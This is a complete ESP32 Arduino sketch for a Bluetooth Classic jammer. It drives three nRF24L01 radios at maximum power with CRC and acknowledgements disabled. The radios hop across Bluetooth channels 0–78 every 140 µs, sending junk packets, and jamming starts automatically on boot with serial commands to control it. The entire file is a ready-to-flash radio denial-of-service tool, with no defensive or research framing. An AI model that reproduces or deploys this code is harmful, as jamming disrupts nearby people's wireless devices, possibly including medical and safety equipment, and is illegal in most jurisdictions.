/*
 * esp32-nrf24-bt-jammer.ino
 * Bluetooth Classic Jammer – Auto‑start on boot.
 * 
 * Timing: 140 µs hopping + 10 µs CPU rest = 150 µs per cycle.
 * Commands: start, stop, status, toggle, help, rate <us>
 *
 * Pin Assignments:
 *   Radio A: CE=4,  CSN=16
 *   Radio B: CE=5,  CSN=17
 *   Radio C: CE=22, CSN=21
 */

#include <Arduino.h>
#include <RF24.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <esp_task_wdt.h>
#include <esp_rom_sys.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

// ─── Pin Definitions ──────────────────────────────────────
#define NRF_CE_PIN_A   4
#define NRF_CSN_PIN_A  16
#define NRF_CE_PIN_B   5
#define NRF_CSN_PIN_B  17
#define NRF_CE_PIN_C   22
#define NRF_CSN_PIN_C  21

// ─── RF24 Objects ──────────────────────────────────────────
static RF24 RadioA(NRF_CE_PIN_A, NRF_CSN_PIN_A);
static RF24 RadioB(NRF_CE_PIN_B, NRF_CSN_PIN_B);
static RF24 RadioC(NRF_CE_PIN_C, NRF_CSN_PIN_C);

// ─── Jamming Parameters ────────────────────────────────────
static const uint8_t CH_MIN = 0;
static const uint8_t CH_MAX = 78;
static const uint8_t PAYLOAD_SIZE = 32;
static uint32_t TX_DELAY_US = 140;   // hopping interval

// ─── Global State ──────────────────────────────────────────
static volatile bool _btActive = false;
static volatile bool _btStopping = false;
static volatile uint32_t _btPacketCount = 0;
static TaskHandle_t _btJammerTaskHandle = NULL;
static uint8_t _junk[PAYLOAD_SIZE];

// ─── Radio Initialisation ──────────────────────────────────
static bool initRadio(RF24& radio) {
  if (!radio.begin()) return false;
  radio.setAutoAck(false);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX);
  radio.setPayloadSize(PAYLOAD_SIZE);
  radio.stopListening();
  radio.flush_tx();
  return true;
}

// ─── Jamming Task ──────────────────────────────────────────
static void jammerTask(void* pv) {
  #if CONFIG_IDF_TARGET_ESP32
    esp_task_wdt_delete(NULL);
  #endif

  // Prepare junk payload
  for (int i = 0; i < PAYLOAD_SIZE; i++) {
    _junk[i] = (i % 2 == 0) ? 0xAA : 0x55;
  }

  uint8_t chA = CH_MIN;
  uint8_t chB = CH_MAX;
  uint8_t chC = CH_MIN + 26;

  bool powered = false;

  while (!_btStopping) {
    if (!_btActive) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }

    // Power up and initialise radios once
    if (!powered) {
      RadioA.powerUp();
      RadioB.powerUp();
      RadioC.powerUp();

      if (initRadio(RadioA) && initRadio(RadioB) && initRadio(RadioC)) {
        powered = true;
      } else {
        RadioA.powerDown();
        RadioB.powerDown();
        RadioC.powerDown();
        _btActive = false;
        vTaskDelay(pdMS_TO_TICKS(100));
        continue;
      }
    }

    // Set channels (dynamic)
    RadioA.setChannel(chA);
    RadioB.setChannel(chB);
    RadioC.setChannel(chC);

    // Flush TX FIFO
    RadioA.flush_tx();
    RadioB.flush_tx();
    RadioC.flush_tx();

    // Transmit
    bool okA = RadioA.writeFast(_junk, PAYLOAD_SIZE);
    bool okB = RadioB.writeFast(_junk, PAYLOAD_SIZE);
    bool okC = RadioC.writeFast(_junk, PAYLOAD_SIZE);

    // Wait for all transmissions to finish (with timeout)
    RadioA.txStandBy(10);
    RadioB.txStandBy(10);
    RadioC.txStandBy(10);

    // 🔥 10 µs CPU rest – gives ESP32 breathing room
    esp_rom_delay_us(10);

    // Count successes
    _btPacketCount += (okA ? 1 : 0) + (okB ? 1 : 0) + (okC ? 1 : 0);

    // Update channels (smoothly cover 0–78)
    chA = (chA + 2) % (CH_MAX + 1);
    chB = (chB - 2 + (CH_MAX + 1)) % (CH_MAX + 1);
    chC = (chC + 3) % (CH_MAX + 1);

    // 🔥 140 µs hopping interval
    esp_rom_delay_us(TX_DELAY_US);
  }

  // Cleanup
  RadioA.powerDown();
  RadioB.powerDown();
  RadioC.powerDown();
  RadioA.stopListening();
  RadioB.stopListening();
  RadioC.stopListening();
  digitalWrite(NRF_CE_PIN_A, LOW);
  digitalWrite(NRF_CE_PIN_B, LOW);
  digitalWrite(NRF_CE_PIN_C, LOW);

  _btJammerTaskHandle = NULL;
  vTaskDelete(NULL);
}

// ─── Public API ────────────────────────────────────────────
bool startBtJammer() {
  if (_btJammerTaskHandle != NULL) {
    Serial.println("! Jammer already running");
    return false;
  }

  // Deinit WiFi and BT to avoid interference
  esp_err_t ret;
  ret = esp_wifi_stop();
  if (ret != ESP_OK && ret != ESP_ERR_WIFI_NOT_INIT) {
    Serial.printf("! WiFi stop error: %d\n", ret);
  }
  ret = esp_wifi_deinit();
  if (ret != ESP_OK && ret != ESP_ERR_WIFI_NOT_INIT) {
    Serial.printf("! WiFi deinit error: %d\n", ret);
  }
  ret = esp_bt_controller_deinit();
  if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
    Serial.printf("! BT deinit error: %d\n", ret);
  }

  _btActive = true;
  _btStopping = false;
  _btPacketCount = 0;

  BaseType_t res = xTaskCreatePinnedToCore(
    jammerTask,
    "bt_jammer",
    4096,
    NULL,
    10,
    &_btJammerTaskHandle,
    0
  );

  if (res != pdPASS) {
    _btActive = false;
    Serial.println("! Failed to create jammer task");
    return false;
  }

  Serial.println("> Jammer started");
  return true;
}

bool stopBtJammer() {
  if (_btJammerTaskHandle == NULL) {
    Serial.println("! Jammer not running");
    return false;
  }

  _btActive = false;
  _btStopping = true;

  uint32_t timeout = millis() + 2000;
  while (_btJammerTaskHandle != NULL && millis() < timeout) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  if (_btJammerTaskHandle != NULL) {
    vTaskDelete(_btJammerTaskHandle);
    _btJammerTaskHandle = NULL;
    Serial.println("! Forced task deletion");
  }

  Serial.println("> Jammer stopped");
  return true;
}

bool btJammerIsActive() {
  return _btActive && _btJammerTaskHandle != NULL;
}

bool btJammerToggle() {
  return btJammerIsActive() ? stopBtJammer() : startBtJammer();
}

// ─── Setup / Loop ──────────────────────────────────────────
void setup() {
  // 🔥 Disable watchdog on core 0 to prevent TG1WDT_SYS_RESET
  disableCore0WDT();

  Serial.begin(115200);
  delay(500);

  Serial.println(F("\nESP32 BT Jammer – Aggressive Mode"));
  Serial.println(F("Timing: 140 µs hopping + 10 µs rest = 150 µs"));
  Serial.println(F("Pins: A(4,16) B(5,17) C(22,21)"));
  Serial.println(F("Commands: start, stop, status, toggle, help, rate <us>"));

  if (startBtJammer()) {
    Serial.println(F("> Auto‑start succeeded."));
  } else {
    Serial.println(F("! Auto‑start failed. Type 'start' to retry."));
  }
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();

    if (cmd == "start") {
      startBtJammer();
    } else if (cmd == "stop") {
      stopBtJammer();
    } else if (cmd == "status") {
      Serial.printf("Jammer is %s\n", btJammerIsActive() ? "ACTIVE" : "INACTIVE");
      Serial.printf("Packets sent: %u\n", _btPacketCount);
    } else if (cmd == "toggle") {
      btJammerToggle();
      Serial.printf("> Toggled. Now %s\n", btJammerIsActive() ? "ACTIVE" : "INACTIVE");
    } else if (cmd == "help") {
      Serial.println(F("Commands: start, stop, status, toggle, help, rate <us>"));
    } else if (cmd.startsWith("rate ")) {
      uint32_t newDelay = cmd.substring(5).toInt();
      if (newDelay >= 10 && newDelay <= 1000) {
        TX_DELAY_US = newDelay;
        Serial.printf("> Rate set to %u µs\n", TX_DELAY_US);
      } else {
        Serial.println("! Invalid rate. Use 10–1000 µs.");
      }
    } else if (cmd.length() > 0) {
      Serial.println(F("Unknown. Type 'help'."));
    }
  }
  vTaskDelay(pdMS_TO_TICKS(10));
}
